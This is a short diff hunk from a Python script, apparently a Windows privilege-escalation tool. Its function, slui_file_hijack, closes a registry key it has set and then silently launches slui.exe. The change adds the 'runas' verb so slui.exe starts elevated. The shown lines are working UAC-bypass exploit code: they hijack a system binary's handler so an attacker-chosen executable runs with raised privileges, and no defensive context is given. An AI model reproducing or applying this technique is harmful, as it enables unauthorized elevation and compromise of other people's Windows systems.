@@ -26,7 +26,7 @@ def slui_file_hijack(executable_path):
 		_winreg.CloseKey(key)
 		return True
 	try:
-		win32api.ShellExecute(0,None,"c:\windows\system32\slui.exe",None,None,win32con.SW_HIDE)
+		win32api.ShellExecute(0,"runas","c:\windows\system32\slui.exe",None,None,win32con.SW_HIDE)
 	except Exception as error:
 		sys.exit()
 	try:
